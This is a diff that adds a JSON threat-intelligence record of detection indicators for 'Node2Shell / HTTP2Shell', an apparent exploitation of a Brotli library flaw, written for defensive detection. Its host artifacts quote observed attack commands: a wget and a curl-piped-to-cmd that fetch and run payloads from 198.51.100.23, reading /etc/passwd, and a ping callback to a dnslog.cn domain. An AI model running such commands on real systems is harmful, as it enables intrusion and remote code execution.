@@ -1,0 +1,190 @@
+{
+  "malware_family": "Node2Shell / HTTP2Shell",
+  "threat_actor": "",
+  "platforms": [
+    "windows",
+    "linux"
+  ],
+  "summary": "Node2Shell / HTTP2Shell refers to the exploitation of CVE-2026-111497, a critical vulnerability in the Brotli compression library. The vulnerability can cause decoder crashes for denial of service, or lead to remote code execution in applications like Node.js. Post-exploitation activity includes downloading scripts and cryptominers, reconnaissance, and out-of-band callbacks on both Linux and Windows systems.",
+  "mitre_techniques": [
+    "T1499.004"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "wget http://198.51.100.23:3000/s.sh",
+      "context": "Executed by node process on Linux host app-node-01.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "ping -c 1 5axzi7.dnslog.cn",
+      "context": "Executed by node process for OOB callback on Linux host app-node-01.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cat /etc/passwd",
+      "context": "Executed by node process on Linux host app-node-01.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd.exe /c \"curl -s https://198.51.100.23/api/w | cmd\"",
+      "context": "Executed by node.exe on Windows host win-dev-01.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "BrotliDecoderDecompressStream",
+      "context": "Function name at the top of the stack in a Node.js core dump.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "libbrotlidec.so.1.1.0",
+      "context": "Library where Node.js process segfaulted during exploitation.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "_brotli.cpython-311",
+      "context": "File associated with a python3 crash during exploitation.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "node -> wget",
+      "context": "Post-exploitation process lineage from IOC list.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "node -> ping",
+      "context": "Post-exploitation process lineage from IOC list.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "node.exe -> cmd.exe",
+      "context": "Post-exploitation process lineage from IOC list.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "node.exe -> powershell.exe",
+      "context": "Post-exploitation process lineage from IOC list.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "_brotli.cpython-311 crash",
+      "context": "Python exploitation attempt crash signature.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "198.51.100.23",
+      "context": "Payload host for scripts s.sh and /api/w.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "5axzi7.dnslog.cn",
+      "context": "Out-of-band callback domain used by ping.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://198.51.100.23:3000/s.sh",
+      "context": "Payload script fetched by wget on app-node-01.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://198.51.100.23/api/w",
+      "context": "Payload URL piped to cmd on win-dev-01.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "dns_pattern",
+      "value": "*.dnslog.cn",
+      "context": "Recommended for egress blocking based on observed callback.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "Content-Encoding: br",
+      "context": "Recommended header to reject at WAF/proxy as a mitigation.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "elf",
+    "script"
+  ]
+}
